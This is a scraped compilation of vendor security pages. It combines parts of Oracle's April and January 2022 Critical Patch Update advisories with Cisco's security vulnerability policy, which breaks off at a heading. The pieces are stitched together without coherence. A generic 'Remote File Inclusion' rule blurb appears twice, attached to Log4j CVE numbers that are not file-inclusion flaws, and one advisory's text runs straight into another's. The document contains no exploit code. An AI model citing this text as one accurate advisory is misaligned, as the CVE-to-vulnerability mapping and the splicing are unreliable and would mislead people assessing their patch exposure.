**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

[CVE-2021-45105](#CVE-2021-45105)
### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

[CVE-2021-45046](#CVE-2021-45046)
[CVE-2021-45105](#CVE-2021-45105)
### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

## Oracle Critical Patch Update Advisory - January 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 497 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [January 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2832416.1).

**Please note that on December 10, 2021, Oracle released a Security Alert for Apache Log4j vulnerabilities [CVE-2021-44228 and CVE-2021-45046](https://www.oracle.com/security-alerts/alert-cve-2021-44228.html). Customers should review the Alert if they have not already done so.**

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujan2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Enterprise Manager Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Enterprise Manager.  6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have Oracle Enterprise Manager installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#EM)

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the January 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2817011.1](https://support.oracle.com/rs?type=doc&id=2817011.1).

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

## Receiving Security Vulnerability Information from Cisco

There are several ways to stay connected and receive the latest security vulnerability information from Cisco. Customers should review the following table, and subsequent summaries, to determine the appropriate option for them:

| **Cisco.com** | <https://www.cisco.com/security/> |
| --- | --- |
| **Email** | cust-security-announce@cisco.com |
| **RSS** | <https://sec.cloudapps.cisco.com/security/center/rss.x?i=44> |
| **Cisco PSIRT openVuln API** | [https://developer.cisco.com/site/PSIRT/](https://developer.cisco.com/site/PSIRT) |
| **My Notifications** | <https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories. This service provides an improved unified subscription experience, allowing users to choose the timing of notifications as well as the notification delivery method (email or RSS feed). The level of access will be determined by the subscriber's relationship with Cisco.

### Creating a Notification

To create a notification, use the following steps:

1. Log in to the [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) on Cisco.com using a registered Cisco.com account name and password.

## Public Relations or Press Queries Regarding Cisco Security Vulnerability Information

The following table shows the Cisco press contacts for Cisco security vulnerability information.

|  | **Press Contacts** |
| --- | --- |
| **Michael Ricketts** | Email: micricke@cisco.comPhone: +1 919 392 2756 |
| **Additional Public Relations** | media\_pr@cisco.com |

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

